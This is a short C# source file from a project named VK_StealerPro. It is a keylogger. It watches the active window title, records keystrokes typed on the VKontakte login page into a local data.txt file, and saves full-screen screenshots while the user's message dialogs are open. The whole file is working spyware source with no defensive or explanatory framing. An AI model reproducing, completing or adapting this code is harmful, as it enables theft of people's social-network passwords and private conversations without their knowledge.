using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using AutoHotkey.Interop;


namespace VK_StealerPro
{
    public partial class HideWindow : Form
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        AutoHotkeyEngine ahk = new AutoHotkeyEngine();

        public HideWindow()
        {
            InitializeComponent();
            File.Delete("data.txt");
            string WinTitle = "";

            while (true)
            {
                System.Threading.Thread.Sleep(10);

                WinTitle = GetActiveWindowTitle();
                if (WinTitle != null)
                {
                    if (WinTitle.Contains("Добро пожаловать | ВКонтакте"))
                    {
                        ahk.ExecRaw("Input, kl, V L1, {Enter}");
                        File.AppendAllText("data.txt", ahk.GetVar("kl"));
                    }
                    if (WinTitle.Contains("Диалоги"))
                    {
                        //ahk.ExecRaw("Input, kl, V, {Enter}");
                        //File.AppendAllText("data.txt", ahk.GetVar("kl") + Environment.NewLine);

                        ImageFromScreen().Save("test.bmp");
                        System.Threading.Thread.Sleep(5000);
                    }                    
                }
                
            }
        }

        public Bitmap ImageFromScreen()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppRgb);
            Graphics gr = Graphics.FromImage(bmp);
            gr.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            return bmp;
        }

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            var Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            return GetWindowText(handle, Buff, nChars) > 0 ? Buff.ToString() : null;
        }
    }
}
